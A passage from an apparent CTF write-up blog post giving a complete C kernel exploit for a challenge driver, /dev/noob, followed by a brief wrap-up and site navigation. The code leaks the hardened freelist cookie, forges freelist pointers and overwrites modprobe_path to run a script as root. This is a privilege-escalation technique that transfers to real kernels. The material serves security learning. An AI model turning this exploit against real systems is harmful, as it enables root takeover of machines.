<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_ALLOC 0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_FREE  0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_EDIT  0X30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_SHOW  0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 0x60</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="keyword">void</span>* uaddr;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> alloc(<span class="keyword">int</span> fd, <span class="keyword">signed</span> <span class="keyword">long</span> idx, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">arg_t</span> <span class="title">arg</span> = &#123;</span></span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret = ioctl(fd, CMD_ALLOC, &amp;arg);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"alloc error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> <span class="keyword">delete</span>(<span class="keyword">int</span> fd, <span class="keyword">signed</span> <span class="keyword">long</span> idx) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">arg_t</span> <span class="title">arg</span> = &#123;</span></span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret = ioctl(fd, CMD_FREE, &amp;arg);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"free error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">signed</span> <span class="keyword">long</span> idx, <span class="keyword">void</span> *uaddr, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">arg_t</span> <span class="title">arg</span> = &#123;</span></span><br><span class="line">        .idx = idx,</span><br><span class="line">        .uaddr = uaddr,</span><br><span class="line">        .size = size</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret = ioctl(fd, CMD_EDIT, &amp;arg);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"edit error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">signed</span> <span class="keyword">long</span> idx, <span class="keyword">void</span> *uaddr, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">arg_t</span> <span class="title">arg</span> = &#123;</span></span><br><span class="line">        .idx = idx,</span><br><span class="line">        .uaddr = uaddr,</span><br><span class="line">        .size = size</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret = ioctl(fd, CMD_SHOW, &amp;arg);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"show error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Prepare chmod file."</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' &gt; /home/pwn/a"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /home/pwn/a"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Prepare trigger file."</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/fake"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /home/pwn/fake"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/noob"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"open /dev/noob"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[BUF_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="keyword">size_t</span> mod_base = <span class="number">0xffffffffc0002000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> potential_ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> victim_idx[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> victim_ptr[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> victim_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; <span class="number">0x18</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim_cnt &gt;= <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        alloc(fd, i, BUF_SIZE);</span><br><span class="line">        show(fd, i, buf, BUF_SIZE);</span><br><span class="line">        potential_ptr = ((<span class="keyword">size_t</span> *)(buf))[<span class="number">5</span>];</span><br><span class="line">        ptr = ((potential_ptr &amp; <span class="number">0xffff000000000000</span>)  ? potential_ptr - <span class="number">0x28</span> : ptr);</span><br><span class="line">        <span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">            victim_idx[victim_cnt] = i;</span><br><span class="line">            victim_ptr[victim_cnt] = ptr;</span><br><span class="line">            victim_cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">        potential_ptr = <span class="number">0</span>;</span><br><span class="line">        ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"idx: %d, ptr: %lx\n"</span>, victim_idx[<span class="number">0</span>], victim_ptr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"idx: %d, ptr: %lx\n"</span>, victim_idx[<span class="number">1</span>], victim_ptr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, victim_idx[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">delete</span>(fd, victim_idx[<span class="number">1</span>]); <span class="comment">// freelist -&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    show(fd, victim_idx[<span class="number">0</span>], buf, BUF_SIZE);</span><br><span class="line">    <span class="keyword">size_t</span> leak0 = ((<span class="keyword">size_t</span> *)(buf))[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leak0: %lx\n"</span>, leak0);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    show(fd, victim_idx[<span class="number">1</span>], buf, BUF_SIZE);</span><br><span class="line">    <span class="keyword">size_t</span> leak1 = ((<span class="keyword">size_t</span> *)(buf))[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leak1: %lx\n"</span>, leak1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> cookie = leak0 ^ victim_ptr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cookie: %lx\n"</span>, cookie);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> magic = (cookie ^ mod_base) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"magic: %llx\n"</span>, magic);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> fake_user_mem1 = mmap(magic &amp; <span class="number">0xffff0000</span>, <span class="number">0x10000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fake_user_mem1: %lx\n"</span>, fake_user_mem1);</span><br><span class="line">    <span class="keyword">size_t</span> fake_ptr = cookie ^ magic;</span><br><span class="line">    <span class="built_in">memcpy</span>(magic, &amp;fake_ptr, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> fake_ptr2 = (<span class="number">0xffffffffc000464c</span> ^ cookie) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fake_ptr2: %lx\n"</span>, fake_ptr2);</span><br><span class="line">    <span class="keyword">size_t</span> fake_user_mem2 = mmap(fake_ptr2 &amp; <span class="number">0xffff0000</span>, <span class="number">0x10000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fake_user_mem2: %lx\n"</span>, fake_user_mem2);</span><br><span class="line">    <span class="keyword">size_t</span> fake_ptr3 = cookie ^ fake_ptr2;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_ptr2, &amp;fake_ptr3, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> target0 = cookie ^ victim_ptr[<span class="number">1</span>] ^ magic;</span><br><span class="line">    <span class="keyword">size_t</span> target1 = cookie ^ victim_ptr[<span class="number">0</span>] ^ <span class="number">0xffffffffc000464c</span>;</span><br><span class="line"></span><br><span class="line">    edit(fd, victim_idx[<span class="number">1</span>], &amp;target0, <span class="number">8</span>);</span><br><span class="line">    edit(fd, victim_idx[<span class="number">0</span>], &amp;target1, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write 4 bytes on pool</span></span><br><span class="line">    alloc(fd, <span class="number">0x18</span>, BUF_SIZE);</span><br><span class="line">    alloc(fd, <span class="number">0x19</span>, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//allocate pool address</span></span><br><span class="line">    alloc(fd, <span class="number">0x1a</span>, BUF_SIZE);</span><br><span class="line">    alloc(fd, <span class="number">0x1b</span>, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// consume fake_ptr2 on freelist to prevent crash;</span></span><br><span class="line">    alloc(fd, <span class="number">0x1c</span>, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> modprobe_path = <span class="number">0xffffffff8245aba0</span>;</span><br><span class="line">    <span class="keyword">char</span> overwrite[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(overwrite+<span class="number">4</span>, &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line">    edit(fd, <span class="number">0x1b</span>, overwrite, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *path = <span class="string">"/home/pwn/a\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">    edit(fd, <span class="number">0x19</span>, path, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"> 	(<span class="keyword">void</span>)argc; (<span class="keyword">void</span>)argv;</span><br><span class="line"></span><br><span class="line">    gen_test();</span><br><span class="line">    exploit();</span><br><span class="line">    system(<span class="string">"cat /proc/sys/kernel/modprobe"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="wrapup"><a class="header-anchor" href="#wrapup">¶</a>Wrapup</h2>
<p>The harderned mechanism is hard to trace at first, I spent a lot of time on trying for a stable breakpoint. The bypass is a little bit confused at the first step, but you could debug and approch the goal step by step.</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/02/21/v8-exploit/" rel="next" title="V8 Exploit">
                <i class="fa fa-chevron-left"></i> V8 Exploit
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/05/18/DEFCON-2020-Quals-nooopsled/" rel="prev" title="[DEFCON 2020 Quals] - nooopsled">
                [DEFCON 2020 Quals] - nooopsled <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">放弃幻想 准备战斗</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">60</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability"><span class="nav-number">1.</span> <span class="nav-text">¶Vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#the-freelist-harderned"><span class="nav-number">2.</span> <span class="nav-text">¶The freelist harderned</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploitation"><span class="nav-number">3.</span> <span class="nav-text">¶Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#leaking-cookie"><span class="nav-number">3.1.</span> <span class="nav-text">¶Leaking cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#faking-fd"><span class="nav-number">4.</span> <span class="nav-text">¶Faking FD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-c"><span class="nav-number">5.</span> <span class="nav-text">¶exp.c</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wrapup"><span class="nav-number">6.</span> <span class="nav-text">¶Wrapup</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
